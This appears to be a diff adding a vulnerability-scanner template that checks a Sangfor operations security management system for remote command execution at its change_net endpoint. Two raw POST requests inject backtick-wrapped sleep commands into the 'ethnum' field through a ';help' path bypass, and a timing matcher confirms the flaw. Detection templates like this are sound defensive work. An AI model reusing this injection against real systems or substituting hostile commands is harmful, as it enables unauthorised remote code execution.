@@ -1,0 +1,33 @@
+id: SANGFOR-change_net-rce
+
+info:
+  name: 深信服运维安全管理系统 change_net 远程命令执行漏洞
+  author: SANGFOR
+  severity: critical
+  tags: SANGFOR
+
+http:
+  - raw:
+      - |
+        POST /fort/system;help/netConfig/change_net HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Content-Type: application/x-www-form-urlencoded
+
+        sta=static&ipv=4&ethnum=%60sleep%202%60&address=1.1.1.1&netmask=2.2.2.2&gateWay=3.3.3.3
+
+      - |
+        POST /fort/system;help/netConfig/change_net HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Content-Type: application/x-www-form-urlencoded
+
+        sta=static&ipv=4&ethnum=%60sleep%204%60&address=1.1.1.1&netmask=2.2.2.2&gateWay=3.3.3.3
+    
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=2 && duration_1<4'  
+          - 'duration_2>=4 && duration_2<6'
+        condition: and
